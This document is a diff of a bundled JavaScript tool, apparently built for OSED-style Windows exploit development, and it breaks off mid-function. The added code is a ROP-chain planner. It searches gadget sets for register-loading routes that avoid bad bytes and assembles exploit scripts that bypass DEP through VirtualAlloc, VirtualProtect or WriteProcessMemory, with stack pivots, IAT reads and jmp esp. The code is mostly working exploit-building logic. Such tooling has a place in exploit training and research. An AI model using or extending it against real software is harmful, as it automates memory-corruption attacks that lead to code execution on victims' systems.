+          const r = l + 1;
+          let m = i;
+          if (l < a.length && ((_a2 = a[l].f) != null ? _a2 : a[l].cost) < ((_b = a[m].f) != null ? _b : a[m].cost))
+            m = l;
+          if (r < a.length && ((_c = a[r].f) != null ? _c : a[r].cost) < ((_d = a[m].f) != null ? _d : a[m].cost))
+            m = r;
+          if (m === i)
+            break;
+          [a[m], a[i]] = [a[i], a[m]];
+          i = m;
+        }
+      }
+      return top;
+    }
+  };
+  var spare = (effect, filled) => Math.max(0, effect.slots - filled);
+  var stackCost = (effect, filled) => {
+    const dwords = spare(effect, filled);
+    return dwords * 3 + (dwords * 4 > LARGE_STACK_MOVE ? 1e3 * MAX_HOPS : 0);
+  };
+  function beatenBy(chosen, other) {
+    const clobbers = (effect) => Object.keys(effect.writes);
+    const extra = clobbers(other).filter((r) => clobbers(chosen).indexOf(r) < 0);
+    if (extra.length > 0)
+      return `also writes ${extra.join(", ")}`;
+    if (other.slots > chosen.slots)
+      return `takes 0x${(other.slots * 4).toString(16)} bytes of stack, against 0x${(chosen.slots * 4).toString(16)}`;
+    if (other.retn > chosen.retn)
+      return `ret 0x${other.retn.toString(16)} skips further past its values`;
+    if (other.reads.length > chosen.reads.length)
+      return "reads memory this one does not";
+    return "more instructions, same effect";
+  }
+  var ReachIndex = class _ReachIndex {
+    constructor(gadgets) {
+      this.cache = {};
+      this.effects = [];
+      for (const gadget of gadgets) {
+        const effect = effectOf(gadget);
+        if (effect)
+          this.effects.push(effect);
+      }
+    }
+    static fromEffects(effects) {
+      const index = new _ReachIndex([]);
+      index.effects = effects;
+      return index;
+    }
+    plus(extra) {
+      return _ReachIndex.fromEffects(this.effects.concat(extra));
+    }
+    get size() {
+      return this.effects.length;
+    }
+    pool(keep) {
+      var _a2;
+      const key2 = keep.slice().sort().join(",");
+      if (this.cache[key2])
+        return this.cache[key2];
+      const usable = this.effects.filter((effect) => Object.keys(effect.writes).every((r) => keep.indexOf(r) < 0));
+      const clobbers = (effect) => Object.keys(effect.writes).length;
+      const weight = (effect) => clobbers(effect) * 10 + stackCost(effect, 1) + effect.retn + effect.gadget.instructions.length;
+      const byReg = {};
+      const alts = /* @__PURE__ */ new Map();
+      for (const r of REGS2) {
+        const groups = {};
+        for (const effect of usable) {
+          const e = effect.writes[r];
+          if (!e || e.op === "unknown" || effect.stores.length > 0)
+            continue;
+          const sig = JSON.stringify(e, (k, v) => k === "id" ? void 0 : v);
+          (groups[sig] = (_a2 = groups[sig]) != null ? _a2 : []).push(effect);
+        }
+        const kept = [];
+        for (const sig of Object.keys(groups)) {
+          const members = groups[sig].sort((a, b) => weight(a) - weight(b));
+          const front = [];
+          for (const m of members) {
+            const mw = Object.keys(m.writes);
+            const beaten = front.some((f) => Object.keys(f.writes).every((w) => mw.indexOf(w) >= 0) && f.slots <= m.slots && f.retn <= m.retn && f.reads.length <= m.reads.length);
+            if (!beaten)
+              front.push(m);
+            if (front.length >= 3)
+              break;
+          }
+          kept.push(...front);
+          for (const chosen of front) {
+            alts.set(chosen, members.filter((other) => other !== chosen).slice(0, 2).map((other) => ({ gadget: other.gadget, why: beatenBy(chosen, other) })));
+          }
+        }
+        byReg[r] = kept;
+      }
+      const storers = usable.filter((effect) => effect.stores.length === 1).sort((a, b) => weight(a) - weight(b)).slice(0, 40);
+      this.cache[key2] = { byReg, storers, alts };
+      return this.cache[key2];
+    }
+    /** The shortest sequence of gadgets that leaves `goal` in `target`, without writing `opts.keep`. */
+    reach(target, goal, opts) {
+      var _a2, _b, _c, _d;
+      const maxHops = (_a2 = opts.maxHops) != null ? _a2 : MAX_HOPS;
+      const maxNodes = (_b = opts.maxNodes) != null ? _b : MAX_NODES;
+      const { byReg, storers, alts } = this.pool(opts.keep);
+      const providers = ((_c = byReg[target]) != null ? _c : []).length;
+      const start = { regs: /* @__PURE__ */ new Map([[target, goal]]), cost: 0, hops: 0 };
+      const best = { [keyOf(start)]: 0 };
+      const open = new Heap();
+      open.push(start);
+      let searched = 0;
+      let truncated = false;
+      while (open.size > 0) {
+        const node = open.pop();
+        if (node.regs.size === 0 && !node.scratch) {
+          const hops = [];
+          for (let at = node; at && at.hop; at = at.prev)
+            hops.push(at.hop);
+          return { hops, searched };
+        }
+        if (best[keyOf(node)] < node.cost)
+          continue;
+        if (node.hops >= maxHops)
+          continue;
+        if (++searched > maxNodes) {
+          truncated = true;
+          break;
+        }
+        const seen = /* @__PURE__ */ new Set();
+        const candidates2 = [];
+        node.regs.forEach((_, r) => {
+          var _a3;
+          for (const effect of (_a3 = byReg[r]) != null ? _a3 : [])
+            if (!seen.has(effect)) {
+              seen.add(effect);
+              candidates2.push(effect);
+            }
+        });
+        if (node.scratch) {
+          for (const effect of storers)
+            if (!seen.has(effect)) {
+              seen.add(effect);
+              candidates2.push(effect);
+            }
+        }
+        for (const effect of candidates2) {
+          for (const next of this.regress(node, effect, opts, (_d = alts.get(effect)) != null ? _d : [])) {
+            const key2 = keyOf(next);
+            if (best[key2] !== void 0 && best[key2] <= next.cost)
+              continue;
+            best[key2] = next.cost;
+            next.f = estimate(next);
+            open.push(next);
+          }
+        }
+      }
+      return { searched, exhausted: !truncated, providers, maxHops };
+    }
+    regress(node, effect, opts, alts) {
+      var _a2;
+      const needed = [];
+      let clobbered = 0;
+      for (const r of Object.keys(effect.writes)) {
+        const v = node.regs.get(r);
+        if (v)
+          needed.push([r, v, effect.writes[r]]);
+        else
+          clobbered += 1;
+      }
+      let alternatives = [{ regs: [], slots: [], pinned: [] }];
+      for (const [, v, e] of needed) {
+        const next = [];
+        for (const need of solve(e, v, opts))
+          for (const alt of alternatives)
+            next.push(join(alt, need));
+        alternatives = next.slice(0, 8);
+        if (alternatives.length === 0)
+          return [];
+      }
+      let storeNote;
+      if (effect.stores.length > 0) {
+        if (!node.scratch || !opts.scratch || effect.stores.length !== 1)
+          return [];
+        const store = effect.stores[0];
+        const next = [];
+        for (const alt of alternatives) {
+          for (const at of solve(store.at, constVal(opts.scratch.at, opts.scratch.text), opts)) {
+            for (const v of solve(store.value, node.scratch, opts))
+              next.push(__spreadProps(__spreadValues({}, join(join(alt, at), v)), { scratch: alt.scratch }));
+          }
+        }
+        alternatives = next;
+        storeNote = `[${opts.scratch.text}] = ${describe(node.scratch)}`;
+      }
+      const out = [];
+      for (const alt of alternatives) {
+        if (effect.reads.some((id) => alt.pinned.indexOf(id) < 0))
+          continue;
+        const regs = /* @__PURE__ */ new Map();
+        node.regs.forEach((v, r) => {
+          if (!effect.writes[r])
+            regs.set(r, v);
+        });
+        let ok2 = true;
+        for (const [r, v] of alt.regs) {
+          if (opts.keep.indexOf(r) >= 0) {
+            ok2 = false;
+            break;
+          }
+          const have = regs.get(r);
+          if (have && !sameVal(have, v)) {
+            ok2 = false;
+            break;
+          }
+          regs.set(r, v);
+        }
+        const slots = /* @__PURE__ */ new Map();
+        const values = [];
+        for (const [i, value, text] of alt.slots) {
+          if (values[i] && ((_a2 = values[i]) == null ? void 0 : _a2.value) !== value) {
+            ok2 = false;
+            break;
+          }
+          values[i] = { value, text };
+          slots.set(i, text);
+        }
+        if (!ok2)
+          continue;
+        let scratch = node.scratch;
+        if (storeNote)
+          scratch = void 0;
+        if (alt.scratch) {
+          if (scratch && !sameVal(scratch, alt.scratch))
+            continue;
+          scratch = alt.scratch;
+        }
+        const notes = needed.map(([r, v, e]) => e.op === "slot" ? `${r} = ${slots.get(e.i)}` : `${r} = ${show(e, slots)}, now ${describe(v)}`);
+        if (storeNote)
+          notes.push(storeNote);
+        const kind = storeNote ? "store" : needed.length > 0 ? kindOf2(needed[0][2]) : "set";
+        const cost = node.cost + 1e3 + clobbered * 10 + stackCost(effect, values.length) + effect.retn + effect.gadget.instructions.length;
+        const dense = [];
+        for (let i = 0; i < values.length; i += 1)
+          dense.push(values[i]);
+        out.push({ regs, scratch, cost, hops: node.hops + 1, prev: node, hop: { gadget: effect.gadget, values: dense, notes, kind, alts } });
+      }
+      return out;
+    }
+  };
+  var isPath = (result3) => "hops" in result3;
 
   // src/commands/dep_plan.ts
   var DEP_PLAN_APIS = ["VirtualAlloc", "VirtualProtect", "WriteProcessMemory"];
@@ -14743,14 +15548,14 @@ var osed_bundle = (() => {
     }
     return found;
   }
-  var LARGE_STACK_MOVE = 64;
+  var LARGE_STACK_MOVE2 = 64;
   function stackMove(gadget) {
     const deltas = [...gadget.semanticSummary.summary.stackDelta.values.exact];
     return deltas.length === 1 ? Number(deltas[0]) - 4 : void 0;
   }
   function movesStackFar(gadget, job) {
     const move = stackMove(gadget);
-    return job.key !== "pivot" && move !== void 0 && move > LARGE_STACK_MOVE;
+    return job.key !== "pivot" && move !== void 0 && move > LARGE_STACK_MOVE2;
   }
   function rejection(gadget, job, at, live, bound) {
     var _a2, _b, _c, _d;
@@ -14921,7 +15726,7 @@ var osed_bundle = (() => {
       lines.push(`      !! every candidate for this job reads through ${pick2.uncontrolled.join(", ")}. Point ${pick2.uncontrolled.join(" and ")} at readable memory before this gadget runs, or the chain dies here.`);
     }
     if (pick2 && pick2.far) {
-      lines.push(`      !! every usable candidate for this job takes more than 0x${LARGE_STACK_MOVE.toString(16)} bytes of stack. This one grows the payload by 0x${((_a2 = stackMove(pick2.gadget)) != null ? _a2 : 0).toString(16)} bytes of junk: check the overflow has room for it.`);
+      lines.push(`      !! every usable candidate for this job takes more than 0x${LARGE_STACK_MOVE2.toString(16)} bytes of stack. This one grows the payload by 0x${((_a2 = stackMove(pick2.gadget)) != null ? _a2 : 0).toString(16)} bytes of junk: check the overflow has room for it.`);
     }
     if (!pick2)
       lines.push(`    none of the ${verdicts.length} keeps ${live.map((entry) => entry.register).join(", ")}`);
@@ -14929,7 +15734,7 @@ var osed_bundle = (() => {
       lines.push(...line(verdict, " ", "usable"));
     return lines;
   }
-  var REGS2 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  var REGS3 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
   var NOT_ESP = [0, 1, 2, 3, 5, 6, 7];
   var rm = (mod, reg, base) => mod << 6 | reg << 3 | base;
   var pairs = () => NOT_ESP.flatMap((a) => NOT_ESP.filter((b) => b !== a).map((b) => [a, b]));
@@ -14943,7 +15748,7 @@ var osed_bundle = (() => {
     REGISTER_INCREMENT: () => NOT_ESP.map((r) => [64 + r]),
     REGISTER_NEGATE: () => NOT_ESP.map((r) => [247, 216 + r]),
     STACK_PIVOT: () => [[148], [201], ...NOT_ESP.flatMap((r) => [[135, rm(3, r, 4)], [135, rm(3, 4, r)], [137, rm(3, r, 4)], [139, rm(3, 4, r)]])],
-    LOAD_REGISTER: (register2) => NOT_ESP.filter((r) => register2 === void 0 || REGS2[r] === register2).map((r) => [88 + r]),
+    LOAD_REGISTER: (register2) => NOT_ESP.filter((r) => register2 === void 0 || REGS3[r] === register2).map((r) => [88 + r]),
     DISPATCH_PUSHAD: () => [[96]]
   };
   function encodingsFor(job) {
@@ -15057,14 +15862,13 @@ var osed_bundle = (() => {
     VirtualProtect: [],
     WriteProcessMemory: [{ name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(528) }, { name: "lpNumberOfBytesWritten", source: WRITABLE }]
   };
-  var JUNK = /^(junk|padding)/;
   var REGISTERS3 = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
-  var hex5 = (value) => hex325(value);
+  var hex6 = (value) => hex325(value);
   var isClean = (value, bad) => [0, 8, 16, 24].every((shift) => bad.indexOf(value >>> shift & 255) < 0);
   var ident = (name) => name.replace(/[^A-Za-z0-9]/g, "_").toLowerCase();
   var far = (gadget) => {
     var _a2;
-    return !movesEsp(gadget) && ((_a2 = stackMove(gadget)) != null ? _a2 : 0) > LARGE_STACK_MOVE;
+    return !movesEsp(gadget) && ((_a2 = stackMove(gadget)) != null ? _a2 : 0) > LARGE_STACK_MOVE2;
   };
   var ownsEsp = (operands, mnemonic) => operands[0] === "esp" || mnemonic === "leave" || mnemonic === "xchg" && operands.indexOf("esp") >= 0;
   function lastRetN(gadget) {
@@ -15102,7 +15906,8 @@ var osed_bundle = (() => {
   }
   function gadgetName(sequenceText) {
     const parts = sequenceText.split(" ; ");
-    const used = parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
+    const pop = parts.findIndex((part, i) => i > 0 && part.indexOf("pop ") === 0);
+    const used = parts[0].indexOf("push ") === 0 && pop > 0 ? [parts[0], parts[pop]] : parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
     return used.join(" ").replace(/\b(dword|word|byte)\b ?/g, "").replace(/\[\s*(e[a-z]{2})[^\]]*\]/g, "mem $1").replace(/0x/g, "").replace(/[^a-z0-9]+/gi, "_").replace(/^_|_$/g, "").toUpperCase();
   }
   function assignNames(table2) {
@@ -15134,14 +15939,14 @@ var osed_bundle = (() => {
     }
     const note = isClean(iatSlot, badchars) ? "" : ". It holds a bad byte, so the chain builds it and never sends it";
     if (!delta)
-      return { block: { lines: [`IAT_SLOT = ${hex5(iatSlot)}     # ${api} in ${module}${note}`] } };
+      return { block: { lines: [`IAT_SLOT = ${hex6(iatSlot)}     # ${api} in ${module}${note}`] } };
     return { block: { lines: [
-      `IAT_SLOT = ${hex5(iatSlot)}     # ${delta.dll}!${delta.anchor} in ${module}${note}`,
-      `API_DELTA = ${hex5(delta.value)}    # ${api} - ${delta.anchor}, measured on this machine. Any Windows update moves it: measure it again on the target`
+      `IAT_SLOT = ${hex6(iatSlot)}     # ${delta.dll}!${delta.anchor} in ${module}${note}`,
+      `API_DELTA = ${hex6(delta.value)}    # ${api} - ${delta.anchor}, measured on this machine. Any Windows update moves it: measure it again on the target`
     ] } };
   }
   function buildExploit(input) {
-    var _a2, _b, _c, _d, _e, _f, _g, _h;
+    var _a2, _b, _c, _d, _e, _f, _g, _h, _i;
     const { api, style, index, badchars } = input;
     const stages = [];
     const nextStage = () => {
@@ -15152,7 +15957,6 @@ var osed_bundle = (() => {
     const gadgets = ((_a2 = index == null ? void 0 : index.gadgets) != null ? _a2 : []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
     const table2 = [];
     const holes = [];
-    const recipes = [];
     const byAddress = {};
     for (const gadget of gadgets)
       byAddress[gadgetAddress(gadget)] = gadget;
@@ -15161,13 +15965,15 @@ var osed_bundle = (() => {
       return (_a3 = input.plans.filter((plan) => plan.job.key === key2)[0]) == null ? void 0 : _a3.pick;
     };
     const swapsFor = (address, loads) => {
+      var _a3;
+      const fromSearch = ((_a3 = searchSwaps[address]) != null ? _a3 : []).filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i).slice(0, 2);
       const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
       if (!plan || !plan.pick)
-        return [];
+        return fromSearch;
       const chosen = plan.pick;
       const sameAt = (verdict) => {
-        var _a3, _b2;
-        return verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source && verdict.at.address === chosen.at.address && ((_a3 = verdict.at.offset) != null ? _a3 : 0) === ((_b2 = chosen.at.offset) != null ? _b2 : 0);
+        var _a4, _b2;
+        return verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source && verdict.at.address === chosen.at.address && ((_a4 = verdict.at.offset) != null ? _a4 : 0) === ((_b2 = chosen.at.offset) != null ? _b2 : 0);
       };
       return plan.verdicts.slice(plan.verdicts.indexOf(chosen) + 1).filter((verdict) => verdict.usable && !verdict.move && verdict.uncontrolled.length === 0 && !verdict.far && verdict.leads && chosen.leads && sameAt(verdict) && input.exclude.indexOf(gadgetAddress(verdict.gadget)) < 0).slice(0, 2).map((verdict) => ({
         address: gadgetAddress(verdict.gadget),
@@ -15175,7 +15981,7 @@ var osed_bundle = (() => {
         pops: extraPops(verdict.gadget, loads),
         retn: lastRetN(verdict.gadget),
         why: sideEffects(verdict.gadget, plan.job)
-      }));
+      })).concat(fromSearch).filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i && swap.address !== address).slice(0, 2);
     };
     const warnings = {};
     for (const plan of input.plans) {
@@ -15195,8 +16001,13 @@ var osed_bundle = (() => {
     const refs = [];
     const ref = (target) => `${refs.push(target) - 1}`;
     const hole = (target, how) => {
-      holes.push(`${target}: ${how}`);
-      return [{ line: `# ${target}: ${how}` }, { line: `${target} = hole(${JSON.stringify(target)})` }];
+      const [first, ...rest] = how.split("\n");
+      holes.push(`${target}: ${first}`);
+      return [
+        { line: `# ${target}: ${first}` },
+        ...rest.map((line) => ({ line: `#   ${line}` })),
+        { line: `${target} = hole(${JSON.stringify(target)})` }
+      ];
     };
     const group = (title) => ({ line: `#-- ${title}` });
     const usable = (gadget, keep, own2) => !movesEsp(gadget) && memoryWrites(gadget, "").length === 0 && writtenRegisters(gadget).every((register2) => own2.indexOf(register2) >= 0 || keep.indexOf(register2) < 0);
@@ -15223,65 +16034,127 @@ var osed_bundle = (() => {
       }
       return void 0;
     };
-    const recipeOps = (recipe, job) => {
-      const ops = [];
-      recipe.steps.forEach((step, i) => {
-        var _a3;
-        if (step.kind !== "gadget" || step.address === void 0)
-          return;
-        const values = [];
-        for (let j = i + 1; j < recipe.steps.length && recipe.steps[j].kind === "value"; j += 1) {
-          if (!JUNK.test(recipe.steps[j].comment))
-            values.push(hex5((_a3 = recipe.steps[j].value) != null ? _a3 : 0));
+    const badSpaced = badchars.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join(" ");
+    const reachIndex = new ReachIndex(gadgets);
+    const scratch = input.writable !== void 0 && isClean(input.writable, badchars) ? { at: input.writable, text: "WRITABLE" } : void 0;
+    const unlockShapes = (register2) => [
+      `pop ${register2}`,
+      `mov ${register2}, dword [${register2}]`,
+      ...REGISTERS3.filter((other) => other !== register2).map((other) => `mov ${register2}, ${other}`),
+      ...REGISTERS3.filter((other) => other !== register2).map((other) => `xchg ${register2}, ${other}`),
+      ...REGISTERS3.filter((other) => other !== register2).map((other) => `add ${register2}, ${other}`),
+      `neg ${register2}`
+    ];
+    const unlock = (register2, goal, keep) => {
+      const shapes = unlockShapes(register2);
+      const synthetic = buildRopIndexFromRpPlusText(shapes.map((shape, i) => `0x${(2130706448 + i * 16).toString(16)}: ${shape} ; ret ;  (1 found)`).join("\n")).gadgets;
+      let found;
+      for (const gadget of synthetic) {
+        const effect = effectOf(gadget);
+        if (!effect)
+          continue;
+        const result3 = reachIndex.plus([effect]).reach(register2, goal, { bad: badchars, keep, scratch, maxNodes: 4e3 });
+        if (isPath(result3) && (!found || result3.hops.length < found.hops)) {
+          found = { shape: sequence(gadget), route: result3.hops.map((hop) => hop.kind).join(", "), hops: result3.hops.length };
         }
-        const gadget = byAddress[Number(step.address)];
-        ops.push({
-          call: gadget ? entry(gadget, job, values.length) : row(Number(step.address), `${step.comment}   <<< not in the scanned corpus: check its extra pops and ret N by hand`, job),
-          values
-        });
-      });
+      }
+      return found;
+    };
+    const unreachable = (register2, goal, keep, name, result3) => {
+      const kept = keep.length > 0 ? ` that ${result3.providers === 1 ? "keeps" : "keep"} ${keep.join(", ")}` : ", with nothing to keep";
+      const pool = `${result3.providers} distinct way${result3.providers === 1 ? "" : "s"} to write ${register2}`;
+      const searched = result3.exhausted ? `searched: ${input.module} gives ${pool}${kept}. No combination of up to ${result3.maxHops} of them reaches it.` : `searched: ${input.module} gives ${pool}${kept}. The search gave up after ${result3.searched} states, short of ${result3.maxHops} gadgets.`;
+      const key2 = unlock(register2, goal, keep);
+      const fix = key2 ? `one gadget would unlock it: ${key2.shape}, which the search then finishes in ${key2.hops} gadget${key2.hops === 1 ? "" : "s"} (${key2.route}).
+confirm it is really absent before changing module: dx @$osed().palette("${input.module}", "${badSpaced}")` : `no single pop, mov, xchg, deref, add or neg of ${register2} would unlock it either, so the value is out of reach in this module whatever gadget turned up.`;
+      const narrow = `the ${result3.providers} way${result3.providers === 1 ? "" : "s"} ${input.module} writes ${register2}${keep.length > 0 ? ` while keeping ${keep.join(", ")}` : ""}`;
+      return {
+        brief: `no route, so load_${ident(name)} below is a hole`,
+        short: `no route among ${narrow}. ${key2 ? `${key2.shape} would unlock it` : "No pop, mov, xchg, deref, add or neg of it would either"}; load_${ident(name)} below says what was searched.`,
+        full: `${register2} = ${name} (${describe(goal)}) cannot be reached.
+${searched}
+${fix}`
+      };
+    };
+    const searchSwaps = {};
+    const routes = [];
+    const briefs = {};
+    const said = [];
+    const say = (register2, name, value, long, brief) => {
+      routes.push(`${register2} = ${name} (${value}): ${long}`);
+      briefs[`load_${ident(name)}`] = `${register2} = ${name}: ${brief}`;
+      said.push(`load_${ident(name)}`);
+    };
+    const answers = {};
+    const reachPath = (register2, goal, keep) => {
+      var _a3, _b2;
+      const key2 = `${register2}|${(_b2 = (_a3 = goal.mem) == null ? void 0 : _a3.at) != null ? _b2 : ""}|${goal.k}|${goal.text}|${keep.slice().sort().join(",")}`;
+      if (!answers[key2])
+        answers[key2] = reachIndex.reach(register2, goal, { bad: badchars, keep, scratch });
+      return answers[key2];
+    };
+    const reachOps = (register2, goal, keep, name) => {
+      var _a3;
+      const result3 = reachPath(register2, goal, keep);
+      if (!isPath(result3)) {
+        const why2 = unreachable(register2, goal, keep, name, result3);
+        say(register2, name, describe(goal), why2.short, why2.brief);
+        return { missing: why2.full };
+      }
+      const ops = [];
+      const kinds = result3.hops.map((hop) => hop.kind).join(", ");
+      if (result3.hops.length > 1) {
+        const why2 = goal.mem ? "read at run time" : isClean(goal.k, badchars) ? "built" : "has bad bytes, so built";
+        ops.push({ line: `# ${register2} = ${describe(goal)}, ${why2}: ${kinds}` });
+      }
+      const names = [];
+      for (const hop of result3.hops) {
+        const values = hop.values.map((value) => value ? value.text : "0x41414141");
+        const row2 = entry(hop.gadget, `${register2} = ${name}`, values.length);
+        names.push(ref(row2));
+        searchSwaps[row2.address] = ((_a3 = searchSwaps[row2.address]) != null ? _a3 : []).concat(hop.alts.filter((alt) => input.exclude.indexOf(gadgetAddress(alt.gadget)) < 0).map((alt) => ({
+          address: gadgetAddress(alt.gadget),
+          sequence: sequence(alt.gadget),
+          pops: extraPops(alt.gadget, values.length),
+          retn: lastRetN(alt.gadget),
+          why: alt.why
+        })));
+        ops.push({ call: row2, values, note: hop.notes.join("; ") });
+      }
+      const dirty = badchars.filter((b) => [0, 8, 16, 24].some((s) => (goal.k >>> s & 255) === b)).map((b) => b.toString(16).padStart(2, "0")).join(" ");
+      const why = result3.hops.length === 1 ? `a direct ${result3.hops[0].kind}` : goal.mem ? `${result3.hops.length} gadgets: the value is the dword at ${goal.mem.text}, known only at run time` : !isClean(goal.k, badchars) ? `${result3.hops.length} gadgets: no pop can send ${hex6(goal.k)}, which holds ${dirty}` : `${result3.hops.length} gadgets, cheapest of ${result3.searched} state${result3.searched === 1 ? "" : "s"}`;
+      say(register2, name, describe(goal), `${names.join(" -> ")}. ${why}`, `${names.join(" -> ")}`);
       return ops;
     };
-    const tryConstOps = (register2, value, expression, keep, label) => {
-      if (isClean(value, badchars)) {
-        const pop = popGadget(register2, keep);
-        if (pop)
-          return [{ call: entry(pop, `load ${register2}`, 1), values: [expression] }];
-      }
-      const direct = input.solve(register2, value, keep);
-      if (direct) {
-        recipes.push({ register: register2, value, keep, label });
-        return recipeOps(direct, `${label}`);
-      }
-      for (const scratch of REGISTERS3) {
-        if (scratch === register2 || keep.indexOf(scratch) >= 0)
-          continue;
-        const recipe = input.solve(scratch, value, keep);
-        const move = recipe ? moveOps(scratch, register2, keep) : void 0;
-        if (recipe && move) {
-          recipes.push({ register: scratch, value, keep, label });
-          return [...recipeOps(recipe, label), ...move];
+    const lone = () => rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
+    const skipper = () => rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
+    const goalOf = (slot2) => {
+      var _a3, _b2;
+      const source = slot2.source;
+      switch (source.kind) {
+        case "api":
+          return input.iatSlot === void 0 ? void 0 : { mem: { at: input.iatSlot, text: "IAT_SLOT" }, k: (_b2 = (_a3 = input.delta) == null ? void 0 : _a3.value) != null ? _b2 : 0, text: input.delta ? "API_DELTA" : "0" };
+        case "const":
+          return constVal(source.value);
+        case "named": {
+          const value = source.name === "WRITABLE" ? input.writable : input.cave;
+          return value === void 0 ? void 0 : constVal(value, source.name);
         }
+        case "nops":
+          return constVal(2425393296);
+        case "ropnop": {
+          const ret = lone();
+          return ret ? constVal(gadgetAddress(ret), "RET") : void 0;
+        }
+        case "jmpesp":
+          return input.jmpEsp === void 0 ? void 0 : constVal(input.jmpEsp, "JMP_ESP");
+        case "skip3": {
+          const skip = skipper();
+          return skip ? constVal(gadgetAddress(skip), "SKIP3") : void 0;
+        }
+        default:
+          return void 0;
       }
-      return void 0;
-    };
-    const constOps = (register2, value, expression, keep, label) => {
-      var _a3;
-      return (_a3 = tryConstOps(register2, value, expression, keep, label)) != null ? _a3 : hole(`${register2}_value`, `${register2} = ${hex5(value)} (${label}): no pop and no rop.construct recipe keeps ${keep.join(", ") || "the chain"}`);
-    };
-    const addConst = (register2, value, expression, keep) => {
-      var _a3;
-      const adders = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability2) => {
-        var _a4, _b2;
-        return capability2.kind === "REGISTER_ADD" && capability2.register === register2 && REGISTERS3.indexOf((_a4 = capability2.targetRegister) != null ? _a4 : "") >= 0 && capability2.targetRegister !== register2 && keep.indexOf((_b2 = capability2.targetRegister) != null ? _b2 : "") < 0;
-      }) && usable(gadget, keep, [register2]))));
-      for (const gadget of adders) {
-        const by = (_a3 = gadget.capabilities.filter((capability2) => capability2.kind === "REGISTER_ADD" && capability2.register === register2)[0].targetRegister) != null ? _a3 : "";
-        const ops = tryConstOps(by, value, expression, keep.concat(register2), `${by} = ${expression}`);
-        if (ops)
-          return [...ops, { call: entry(gadget, `add ${expression}`), values: [] }];
-      }
-      return void 0;
     };
     const capture = pick2("capture");
     const add = pick2("add");
@@ -15311,69 +16184,50 @@ var osed_bundle = (() => {
       return void 0;
     };
     const load = (slot2, register2, keep) => {
-      var _a3, _b2, _c2, _d2;
       const source = slot2.source;
       const missing = (why) => hole(`${ident(slot2.name)}_value`, why);
+      const to = (goal, why) => {
+        if (!goal)
+          return missing(why);
+        const ops = reachOps(register2, goal, keep, slot2.name);
+        return "missing" in ops ? missing(ops.missing) : ops;
+      };
       switch (source.kind) {
-        case "api": {
-          if (!(read == null ? void 0 : read.at.address) || input.iatSlot === void 0)
-            return missing("no gadget reads the IAT slot");
-          const offset = (_a3 = read.at.offset) != null ? _a3 : 0;
-          const expression = offset ? `IAT_SLOT ${offset < 0 ? "+" : "-"} ${hex5(Math.abs(offset))}` : "IAT_SLOT";
-          const move = moveOps((_b2 = read.at.dest) != null ? _b2 : "", register2, keep);
-          if (!move)
-            return missing(`no gadget moves ${read.at.dest} into ${register2}`);
-          const before = input.delta && read.at.dest ? addConst(read.at.dest, input.delta.value, "API_DELTA", keep) : [];
-          const after = before ? [] : addConst(register2, (_d2 = (_c2 = input.delta) == null ? void 0 : _c2.value) != null ? _d2 : 0, "API_DELTA", keep);
-          if (!before && !after)
-            return missing(`no gadget adds API_DELTA to ${read.at.dest} or ${register2} through a register the chain does not need here`);
-          return [
-            ...constOps(read.at.address, input.iatSlot - offset >>> 0, expression, keep, `${read.at.address} = ${expression}`),
-            { call: entry(read.gadget, "read the IAT slot"), values: [] },
-            ...before != null ? before : [],
-            ...move,
-            ...after != null ? after : []
-          ];
-        }
+        case "api":
+          return to(goalOf(slot2), "no IAT slot to read: see [2/7]");
         case "const":
-          return constOps(register2, source.value, hex5(source.value), keep, `${slot2.name} = ${hex5(source.value)}`);
+          return to(constVal(source.value), "");
         case "named": {
           const value = source.name === "WRITABLE" ? input.writable : input.cave;
-          return value === void 0 ? missing(`no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "<bad chars>", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`) : constOps(register2, value, source.name, keep, slot2.name);
+          return to(value === void 0 ? void 0 : constVal(value, source.name), `no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "${badSpaced}", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`);
         }
         case "nops":
-          return constOps(register2, 2425393296, "0x90909090", keep, "four NOPs");
+          return to(constVal(2425393296), "");
         case "ropnop": {
-          const ret = rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
-          const pop = popGadget(register2, keep);
-          if (!ret || !pop)
-            return missing(ret ? `no pop ${register2} in ${input.module}` : `no lone ret in ${input.module}`);
-          return [{ call: entry(pop, `load ${register2}`, 1), values: [ref(entry(ret, "ROP NOP"))] }];
+          const ret = lone();
+          return to(ret ? constVal(gadgetAddress(ret), ref(entry(ret, "ROP NOP"))) : void 0, `no lone ret in ${input.module}`);
         }
-        case "jmpesp": {
-          const pop = popGadget(register2, keep);
-          if (input.jmpEsp === void 0 || !pop)
-            return missing(input.jmpEsp === void 0 ? `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)` : `no pop ${register2} in ${input.module}`);
-          return [{ call: entry(pop, `load ${register2}`, 1), values: [ref(row(input.jmpEsp, "jmp esp", "return into the stack"))] }];
-        }
+        case "jmpesp":
